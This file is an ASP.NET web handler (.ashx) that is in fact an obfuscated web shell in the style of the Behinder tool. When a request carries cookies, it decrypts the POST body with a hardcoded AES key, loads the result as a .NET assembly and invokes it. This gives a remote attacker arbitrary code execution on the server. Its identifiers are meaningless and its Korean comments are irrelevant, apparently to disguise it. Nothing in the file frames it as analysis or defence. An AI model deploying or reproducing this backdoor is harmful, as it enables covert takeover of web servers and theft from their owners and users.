<%@ WebHandler Language="C#" Class="aa" %>
using System.Web;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System;
// 배고파요, 치킨 먹고 싶다
public class aa:IHttpHandler{private byte[] bb(byte[] c,byte[] d){var e=new RijndaelManaged();var f=e.CreateDecryptor(d,d);return f.TransformFinalBlock(c,0,c.Length);}private object cc(byte[] g){return Assembly.Load(g).CreateInstance(string.Concat("K"));}private void dd(object h, HttpContext i){h.GetType().GetMethod("Equals").Invoke(h,new object[]{i});}public void ProcessRequest(HttpContext z){if(z.Request.Cookies.Count>0){var j=Encoding.Default.GetBytes(string.Join("",new string[]{"ca63","4575","38b9","b1e0"}));var k=new byte[z.Request.ContentLength];z.Request.InputStream.Read(k,0,k.Length);Func<byte[],byte[],byte[]> l=bb;byte[] m=l(k,j);object n=cc(m);dd(n,z);}}public bool IsReusable{get{return false;/* 안녕하세요 */}}}